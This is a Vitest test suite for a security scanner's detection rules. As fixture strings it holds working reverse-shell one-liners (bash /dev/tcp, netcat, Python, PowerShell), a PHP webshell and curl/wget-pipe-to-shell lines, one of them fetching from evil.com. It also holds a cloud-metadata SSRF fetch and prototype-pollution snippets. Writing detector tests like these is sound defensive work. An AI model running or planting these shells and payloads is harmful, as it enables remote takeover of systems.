import { describe, it, expect } from 'vitest';
import { runAdvancedRules } from '../advancedRules';

describe('Advanced Rules', () => {
  describe('Crypto Mining Detection', () => {
    it('should detect coinhive mining library', () => {
      const content = `
        import CoinHive from 'coinhive';
        const miner = new CoinHive.Anonymous('site-key');
        miner.start();
      `;
      const findings = runAdvancedRules('script.js', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('crypto-mining');
      expect(findings[0].evidence.note?.toLowerCase()).toContain('coinhive');
    });

    it('should detect cryptoloot', () => {
      const content = `const c = new CryptoLoot.Anonymous('key');`;
      const findings = runAdvancedRules('miner.js', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('crypto-mining');
    });

    it('should detect WebWorker mining patterns', () => {
      const content = `new Worker('crypto-miner.js')`;
      const findings = runAdvancedRules('app.js', content);
      expect(findings.length).toBeGreaterThan(0);
    });
  });

  describe('Backdoor Detection', () => {
    it('should detect bash reverse shell', () => {
      const content = `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`;
      const findings = runAdvancedRules('exploit.sh', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('backdoor-detected');
      expect(findings[0].severity).toBe('critical');
    });

    it('should detect netcat reverse shell', () => {
      const content = `nc -e /bin/sh 192.168.1.1 4444`;
      const findings = runAdvancedRules('shell.sh', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('backdoor-detected');
    });

    it('should detect Python reverse shell pattern', () => {
      const content = `
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.0.0.1",4444))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        subprocess.call(["/bin/sh","-i"])
      `;
      const findings = runAdvancedRules('revshell.py', content);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should detect PowerShell reverse shell', () => {
      const content = `$client = New-Object System.Net.Sockets.TCPClient("192.168.1.1",4444)`;
      const findings = runAdvancedRules('shell.ps1', content);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should detect PHP webshell pattern', () => {
      const content = `<?php eval(base64_decode($_POST['cmd'])); ?>`;
      const findings = runAdvancedRules('shell.php', content);
      expect(findings.length).toBeGreaterThan(0);
    });
  });

  describe('Dockerfile Security', () => {
    it('should detect privileged container', () => {
      const content = `
        FROM node:18
        RUN --privileged npm install
      `;
      const findings = runAdvancedRules('Dockerfile', content);
      expect(findings.some(f => f.id === 'docker-privileged')).toBe(true);
    });

    it('should detect dangerous capabilities', () => {
      const content = `
        FROM ubuntu
        RUN docker run --cap-add=SYS_ADMIN myimage
      `;
      const findings = runAdvancedRules('Dockerfile', content);
      expect(findings.some(f => f.id === 'docker-dangerous-cap')).toBe(true);
    });

    it('should detect hardcoded secrets', () => {
      const content = `
        FROM node:18
        ENV DATABASE_PASSWORD=supersecret123
        RUN npm install
      `;
      const findings = runAdvancedRules('Dockerfile', content);
      expect(findings.some(f => f.id === 'docker-hardcoded-secret')).toBe(true);
    });

    it('should detect missing USER instruction', () => {
      const content = `
        FROM node:18
        WORKDIR /app
        COPY . .
        RUN npm install
        CMD ["node", "server.js"]
      `;
      const findings = runAdvancedRules('Dockerfile', content);
      expect(findings.some(f => f.id === 'docker-no-user')).toBe(true);
    });

    it('should detect curl | bash in Dockerfile', () => {
      const content = `
        FROM node:18
        RUN curl -fsSL https://example.com/install.sh | bash
      `;
      const findings = runAdvancedRules('Dockerfile', content);
      expect(findings.some(f => f.id === 'docker-curl-bash')).toBe(true);
    });
  });

  describe('Prototype Pollution Detection', () => {
    it('should detect __proto__ manipulation', () => {
      const content = `obj["__proto__"].isAdmin = true;`;
      const findings = runAdvancedRules('exploit.js', content);
      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].id).toBe('prototype-pollution');
    });

    it('should detect constructor.prototype manipulation', () => {
      const content = `obj["constructor"]["prototype"].isAdmin = true;`;
      const findings = runAdvancedRules('hack.ts', content);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should detect Object.setPrototypeOf', () => {
      const content = `Object.setPrototypeOf(target, maliciousProto);`;
      const findings = runAdvancedRules('proto.js', content);
      expect(findings.length).toBeGreaterThan(0);
    });
  });

  describe('CI/CD Platform Detection', () => {
    it('should detect GitLab CI unpinned images', () => {
      const content = `
        build:
          image: node:latest
          script:
            - npm install
      `;
      const findings = runAdvancedRules('.gitlab-ci.yml', content);
      expect(findings.some(f => f.id === 'gitlab-unpinned-image')).toBe(true);
    });

    it('should detect GitLab CI curl | bash', () => {
      const content = `
        install:
          script:
            - curl https://example.com/setup.sh | bash
      `;
      const findings = runAdvancedRules('.gitlab-ci.yml', content);
      expect(findings.some(f => f.id === 'gitlab-curl-bash')).toBe(true);
    });

    it('should detect Bitbucket Pipeline issues', () => {
      const content = `
        image: python:latest
        pipelines:
          default:
            - step:
                script:
                  - wget https://evil.com/script.sh | sh
      `;
      const findings = runAdvancedRules('bitbucket-pipelines.yml', content);
      expect(findings.some(f => f.id?.includes('bitbucket'))).toBe(true);
    });

    it('should detect Azure Pipeline issues', () => {
      const content = `
        container: node:latest
        steps:
          - script: curl https://example.com/install.sh | bash
      `;
      const findings = runAdvancedRules('azure-pipelines.yml', content);
      expect(findings.length).toBeGreaterThan(0);
    });

    it('should detect Jenkins Groovy eval', () => {
      const content = `
        pipeline {
          stages {
            stage('Build') {
              steps {
                script {
                  evaluate(params.SCRIPT)
                }
              }
            }
          }
        }
      `;
      const findings = runAdvancedRules('Jenkinsfile', content);
      expect(findings.some(f => f.id === 'jenkins-groovy-eval')).toBe(true);
    });
  });

  describe('SSRF Detection', () => {
    it('should detect fetch to metadata endpoint', () => {
      const content = `fetch('http://169.254.169.254/latest/meta-data/')`;
      const findings = runAdvancedRules('ssrf.js', content);
      expect(findings.some(f => f.id === 'ssrf-pattern')).toBe(true);
    });

    it('should detect requests to internal IPs', () => {
      const content = `fetch('http://192.168.1.100/admin')`;
      const findings = runAdvancedRules('internal.ts', content);
      expect(findings.some(f => f.id === 'ssrf-pattern')).toBe(true);
    });
  });

  describe('Safe Files', () => {
    it('should not flag normal JavaScript', () => {
      const content = `
        function greet(name) {
          console.log('Hello, ' + name);
        }
        export default greet;
      `;
      const findings = runAdvancedRules('utils.js', content);
      expect(findings.length).toBe(0);
    });

    it('should not flag normal Dockerfile', () => {
      const content = `
        FROM node:18-alpine
        USER node
        WORKDIR /app
        COPY package*.json ./
        RUN npm ci --only=production
        COPY . .
        CMD ["node", "server.js"]
      `;
      const findings = runAdvancedRules('Dockerfile', content);
      // Only the :latest check wouldn't trigger since we use 18-alpine
      const criticalFindings = findings.filter(f => f.severity === 'critical' || f.severity === 'high');
      expect(criticalFindings.length).toBe(0);
    });
  });
});
